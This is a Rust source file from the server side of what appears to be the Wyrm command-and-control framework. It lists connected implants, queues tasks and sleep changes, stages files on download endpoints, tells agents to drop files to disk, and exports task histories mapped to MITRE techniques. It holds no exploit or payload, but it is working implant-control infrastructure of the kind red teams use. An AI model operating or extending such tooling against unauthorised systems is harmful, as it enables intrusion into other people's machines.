use std::{
    path::{Path, PathBuf},
    sync::Arc,
};

use crate::{
    DB_EXPORT_PATH, FILE_STORE_PATH,
    app_state::{AppState, DownloadEndpointData},
    logging::{log_error, log_error_async},
};
use axum::extract::State;
use chrono::{SecondsFormat, Utc};
use serde_json::Value;
use shared::tasks::{
    Command, DELIM_FILE_DROP_METADATA, FileDropMetadata, NewAgentStaging, WyrmResult,
};
use shared_c2_client::{AgentC2MemoryNotifications, MapToMitre, TaskExport};
use tokio::{fs, io::AsyncWriteExt};

pub mod dispatch_table;
mod execute;
pub mod implant_builder;

async fn remove_dir(save_path: impl AsRef<Path>) -> Result<(), String> {
    if let Err(e) = fs::remove_dir_all(save_path).await {
        let msg = format!("Failed to remove directory for tmp after building profiles. {e}");
        log_error_async(&msg).await;
        return Err(msg);
    }

    Ok(())
}

async fn remove_file(file_path: impl AsRef<Path>) -> Result<(), String> {
    if let Err(e) = fs::remove_file(file_path.as_ref()).await {
        let msg = format!("Failed to remove file for tmp.7z after building profiles. {e}");
        log_error_async(&msg).await;
        return Err(msg);
    }

    Ok(())
}

async fn list_agents(state: State<Arc<AppState>>) -> Option<Value> {
    let mut new_agents: Vec<AgentC2MemoryNotifications> = Vec::new();

    let agents = state.connected_agents.snapshot_agents().await;
    for agent in agents {
        let last_check_in = agent
            .last_checkin_time
            .to_rfc3339_opts(chrono::SecondsFormat::Secs, true);

        let formatted = format!(
            "\t{}\t\t{}\t{}\t{}",
            agent.uid, last_check_in, agent.first_run_data.b, agent.first_run_data.c,
        );

        let new_messages = pull_notifications_for_agent(agent.uid.clone(), state.clone()).await;
        new_agents.push((formatted, agent.is_stale, new_messages));
    }

    Some(serde_json::to_value(&new_agents).expect("could not serialise"))
}

/// Inserts a new task for the agent where the format of the task metadata is already valid. This function is
/// just a wrapper for a database interaction.
///
/// # Returns
/// None - the task is queued and the resulting data can be made available with the 'n' function on the cli.
async fn task_agent<T: Into<String>>(
    command: Command,
    metadata: Option<T>,
    uid: String,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    let metadata = metadata.map(|t| t.into());

    state
        .db_pool
        .add_task_for_agent_by_id(&uid, command, metadata)
        .await
        .unwrap();

    None
}

/// Inserts a new task in the db instructing the agent to alter its sleep time. This will also be reflected in the
/// agent's metadata on the agent db entry for persistence.
async fn task_agent_sleep(time: i64, uid: String, state: State<Arc<AppState>>) -> Option<Value> {
    let time_as_str = time.to_string();
    state
        .db_pool
        .update_agent_sleep_time(&uid, time)
        .await
        .unwrap();

    state
        .db_pool
        .add_task_for_agent_by_id(&uid, Command::Sleep, Some(time_as_str))
        .await
        .unwrap();

    // We dont have any metadata to send back to the client, so an empty vec is sufficient
    None
}

/// Queries the database for the pending notifications for a given agent, and then marks them as pulled.
async fn pull_notifications_for_agent(uid: String, state: State<Arc<AppState>>) -> Option<Value> {
    // Used to store the completed ID's we took from the DB to mark them as
    // pulled.
    let mut ids = Vec::new();

    //
    // Pulling the notifications will also mark as complete; so grab them and return
    //

    let agent_notifications = match state.db_pool.pull_notifications_for_agent(&uid).await {
        Ok(inner) => {
            let inner = inner.map(|t| {
                t.iter().for_each(|n| ids.push(n.completed_id));
                serde_json::to_value(&t).unwrap()
            });
            if inner.is_none() {
                return inner;
            } else {
                inner
            }
        }
        Err(e) => {
            log_error_async(&format!(
                "Could not pull notifications for agent {uid}. {e}"
            ))
            .await;
            return None;
        }
    };
    agent_notifications
}

/// Returns the time of the server in UTC
fn show_server_time() -> Option<Value> {
    let time_now = Utc::now();
    let time_now_snipped = time_now.to_rfc3339_opts(SecondsFormat::Secs, true);

    match serde_json::to_value(&time_now_snipped) {
        Ok(time) => Some(time),
        Err(e) => {
            let s = format!("Failed to serialise server time. {e}");
            Some(serde_json::to_value(&s).unwrap())
        }
    }
}

/// Lists staged resources on the C2, such as staged agents
async fn list_staged_resources(state: State<Arc<AppState>>) -> Option<Value> {
    let results = match state.db_pool.get_staged_agent_data().await {
        Ok(r) => WyrmResult::Ok(r),
        Err(e) => {
            log_error_async(&format!("Failed to list resources: {e:?}")).await;
            WyrmResult::Err(e.to_string())
        }
    };

    let ser = serde_json::to_value(results).unwrap();

    Some(ser)
}

/// Deletes a staged resource from the database by its internal stage name
async fn delete_staged_resources(
    state: State<Arc<AppState>>,
    download_endpoint: String,
) -> Option<Value> {
    // Delete from db
    let results = state
        .db_pool
        .delete_staged_resource_by_uri(&download_endpoint)
        .await
        .unwrap();

    {
        // remove the download stage from the in memory list
        let mut lock = state.endpoints.write().await;
        lock.download_endpoints.remove(&download_endpoint);
    }

    // Delete from disk
    let mut file_to_delete = PathBuf::from(FILE_STORE_PATH);
    file_to_delete.push(results);
    tokio::fs::remove_file(&file_to_delete).await.unwrap();

    let ser = serde_json::to_value(()).unwrap();

    Some(ser)
}

async fn remove_agent_from_list(state: State<Arc<AppState>>, agent_name: String) -> Option<Value> {
    state.connected_agents.remove_agent(&agent_name).await;

    None
}

/// Error state which could occur when trying to add a stage or file to the C2
#[derive(Debug)]
enum StageError {
    EndpointExistsDownload,
    EndpointExistsCheckIn,
}

/// Adds an API endpoint for public use on the C2 which relates to a custom file / a new agent uploaded
/// by the admin on the client.
///
/// The function handles errors and deconflictions, ensuring that we do not cause any duplication. If no errors are
/// encountered, it will insert the relevant data into the in-memory structures.
///
/// This function does **not** handle database insertions, and assumes they have already been done / will be done
/// hereafter.
///
/// # Returns
/// - `Ok`: If successful, unit Ok is returned
/// - `Err`: If there is an error adding a URI, the error is returned as a [`StageError`]
async fn add_api_endpoint_for_staged_resource(
    data: &NewAgentStaging,
    state: State<Arc<AppState>>,
) -> Result<(), StageError> {
    // Check we dont overlap incompatible URI's
    is_download_staging_url_error(data, &state).await?;

    let mut server_endpoints = state.endpoints.write().await;

    server_endpoints.download_endpoints.insert(
        data.staging_endpoint.clone(),
        DownloadEndpointData::new(&data.pe_name, &data.implant_name, None),
    );

    Ok(())
}

/// Checks whether a staged URI exists in a way which is incompatible. For example, you cannot have two
/// download URI's that overlap, and you cannot have a checkin URI overlapping with a download URI.
async fn is_download_staging_url_error(
    data: &NewAgentStaging,
    state: &State<Arc<AppState>>,
) -> Result<(), StageError> {
    //
    // Check for conflicts with download and staging API's, that is what we look for in the first
    // three vars, `c2_conflicts_download`, `staging_conflicts_c2` & `staging_conflicts_self`
    //
    let server_endpoints = state.endpoints.read().await;
    for e in &data.c2_endpoints {
        if server_endpoints.download_endpoints.contains_key(e) == true {
            return Err(StageError::EndpointExistsDownload);
        }
    }

    // Check the existing C2 endpoints with the proposed staging endpoint (only in the case
    // where the operator is building manually as opposed to the profile). Building via the profile
    // currently results in a empty string "", which is why we do this check.
    if !data.staging_endpoint.is_empty()
        && server_endpoints
            .c2_endpoints
            .contains(&data.staging_endpoint)
    {
        return Err(StageError::EndpointExistsCheckIn);
    }

    if server_endpoints
        .download_endpoints
        .contains_key(&data.staging_endpoint)
    {
        return Err(StageError::EndpointExistsDownload);
    }

    Ok(())
}

/// Handler for instructing the agent to drop a file to disk.
async fn drop_file_handler(
    uid: Option<String>,
    mut data: FileDropMetadata,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    // check we dont have the delimiter in the input
    if data.download_name.contains(DELIM_FILE_DROP_METADATA)
        || data.internal_name.contains(DELIM_FILE_DROP_METADATA)
        || data
            .download_uri
            .as_deref()
            .unwrap_or_default()
            .contains(DELIM_FILE_DROP_METADATA)
    {
        return Some(
            serde_json::to_value(WyrmResult::Err::<String>(format!(
                "Content cannot contain {DELIM_FILE_DROP_METADATA}"
            )))
            .unwrap(),
        );
    }

    let Some(download_uri) = state
        .endpoints
        .read()
        .await
        .find_format_download_endpoint(&data.internal_name)
    else {
        let msg = format!(
            "Could not find staged file when instructing agent to drop a file to disk. Looking for file name: '{}' \
            but it does not exist in memory.",
            data.internal_name
        );
        log_error_async(&msg).await;
        return Some(serde_json::to_value(WyrmResult::Err::<String>(msg)).unwrap());
    };

    data.download_uri = Some(download_uri);

    task_agent::<String>(Command::Drop, Some(data.into()), uid.unwrap(), state).await
}

/// Exports the completed tasks on an agent (by its ID) to a json file in the C2 filesystem
async fn export_completed_tasks_to_json(uid: String, state: State<Arc<AppState>>) -> Option<Value> {
    //
    // This whole block here just unwraps explicitly twice safely through matches trying to get the inner
    // data. If there was an error or there was no data, this is handled and the function will immediately
    // return. Using thiserror or using maps may be a little nicer...
    //
    let results = match state.db_pool.get_agent_export_data(uid.as_str()).await {
        Ok(r) => match r {
            Some(r) => {
                if r.is_empty() {
                    let msg = format!("Tasks for implant: {uid} were empty");
                    log_error(&msg);
                    return Some(serde_json::to_value(msg).unwrap());
                }

                r
            }
            None => {
                let msg = format!("Tasks for implant: {uid} were empty");
                log_error(&msg);
                return Some(serde_json::to_value(msg).unwrap());
            }
        },
        Err(e) => {
            let msg = format!(
                "Error encountered for implant: {uid} when trying to fetch completed tasks. {e}"
            );
            log_error(&msg);
            return Some(serde_json::to_value(msg).unwrap());
        }
    };

    // Serialise
    let mut results_with_mitre: Vec<TaskExport> = Vec::with_capacity(results.len());

    for task in &results {
        results_with_mitre.push(TaskExport::new(task, task.command.map_to_mitre()));
    }

    let json_export = serde_json::to_string(&results_with_mitre)
        .map_err(|e| {
            let msg = format!("Could not serialise db results for agent: {uid}. {e}");
            log_error(&msg);

            Some(serde_json::to_value(msg).unwrap())
        })
        .unwrap();

    //
    // Try write the data to the fs
    //
    let mut path = PathBuf::from(DB_EXPORT_PATH);
    path.push(&uid);
    path.add_extension("json");

    let mut file = tokio::fs::OpenOptions::new()
        .write(true)
        .read(true)
        .create(true)
        .truncate(true)
        .open(&path)
        .await
        .map_err(|e| {
            let msg = format!(
                "Could not create db export file on fs for agent: {uid}. Path: {}, {e}",
                path.display()
            );
            log_error(&msg);
            Some(serde_json::to_value(msg).unwrap())
        })
        .unwrap();

    if let Err(e) = file.write(json_export.as_bytes()).await {
        log_error(&format!(
            "Could not write to output file {} for agent: {uid}. {e}",
            path.display()
        ));
        return None;
    };

    Some(serde_json::to_value(format!("File exported as {uid}")).unwrap())
}
